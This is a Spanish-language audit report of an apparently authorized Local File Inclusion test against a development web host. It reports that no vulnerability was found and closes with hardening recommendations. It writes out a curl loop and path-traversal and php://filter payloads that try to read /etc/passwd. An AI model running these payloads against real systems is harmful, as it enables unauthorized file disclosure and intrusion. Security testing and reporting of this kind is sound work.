# Informe de auditoría LFI — 2026-04-27T15:40:46Z

Resumen ejecutivo
-----------------
Objetivo: http://web.dev.local:8081
Tipo de prueba: Local File Inclusion (LFI) — reconocimiento y explotación activa autorizada
Resultado resumido: No se ha confirmado la lectura de ficheros sensibles ni divulgación de ficheros de la aplicación durante esta sesión.

Estado del hallazgo
-------------------
VULN_FOUND: false
VULN_EXPLOITED: false

Alcance y metodología
---------------------
- Identificación de parámetros dinámicos comunes en la URL: file, page, view, template, include, inc, path, document, name, p.
- Pruebas de traversal y uso de wrappers php://filter para intentar leer ficheros fuera del directorio web.
- Herramientas y utilidades usadas: curl (por scripting) desde el host de auditoría; resultado almacenado en /tmp/lfi_scan/output.txt para revisión.

Comandos y payloads ejecutados (ejemplos exactos)
-------------------------------------------------
Se ejecutaron múltiples peticiones HTTP mediante curl iterando parámetros y payloads. Comandos ejemplares usados desde la shell de auditoría:

for p in file page view template include inc path document name p; do
  for pay in "../../../../../../etc/passwd" "../../../../../etc/passwd" "../../../etc/passwd" "../../etc/passwd" "/etc/passwd" "php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd"; do
    curl -s --max-time 10 "http://web.dev.local:8081/?$p=$pay"
  done
done

Payloads intentados (no exhaustivo)
- ../../../../../../etc/passwd
- ../../../etc/passwd
- ../../etc/passwd
- /etc/passwd
- php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd

Hallazgos detallados
--------------------
- Las respuestas analizadas durante este escaneo devolvieron principalmente contenido HTML de la aplicación (página principal y plantillas), sin aparición de contenido de /etc/passwd ni de ficheros sensibles (.env, .htaccess, config.php.bak, .git/config, etc.).
- No se observaron errores PHP que exhibieran path disclosure (por ejemplo: "Warning: include" con rutas absolutas) ni mensajes que indicaran inclusión directa de ficheros locales.
- En el registro temporal /tmp/lfi_scan/output.txt se identificaron las URLs probadas y las respuestas completas; no se halló evidencia de lectura de ficheros sensibles.

Evidencias y trazas
-------------------
- Archivo de salida del escaneo: /tmp/lfi_scan/output.txt (contiene todas las peticiones y las respuestas almacenadas durante la ejecución). Se ha revisado la salida parcial y no contiene entradas de /etc/passwd.
- Muestras de URLs probadas (en el registro):
  - http://web.dev.local:8081/?file=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
  - http://web.dev.local:8081/?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
  - ... (otros parámetros equivalentes)

Impacto y valoración
--------------------
- Durante esta iteración no se confirmó una vulnerabilidad LFI explotable; por tanto no se accedió a ficheros del sistema (/etc/passwd, /etc/shadow, claves SSH, etc.) ni se consiguió escalada a RCE.
- Riesgo: si fines de prueba futuros revelan inclusión de ficheros, el impacto sería alto (exposición de secretos, credenciales, posibilidad de RCE mediante técnicas adicionales como log poisoning).

Recomendaciones
---------------
1. Validación y saneamiento estricto de parámetros usados en includes (no usar valores del usuario directamente en include/require).
2. Uso de listas blancas (whitelisting) para permitir únicamente ficheros esperados por la aplicación.
3. Deshabilitar wrappers potencialmente peligrosos o filtrar "php://" y "data://" en entradas que controlen includes.
4. Evitar exponer errores PHP en producción (display_errors = Off) y registrar errores de forma segura.

Siguientes pasos sugeridos
-------------------------
- Ejecutar un fuzzing más profundo con ffuf o wfuzz usando diccionarios de SecLists sobre parámetros detectados (si se desea continuar el testing autorizadamente).
- Revisar código fuente (si está disponible) para buscar puntos donde se haga include($param).

Anexos
------
- Registro del escaneo temporal: /tmp/lfi_scan/output.txt
- Tiempo de la prueba: 2026-04-27T15:40:46Z

Fin del informe.
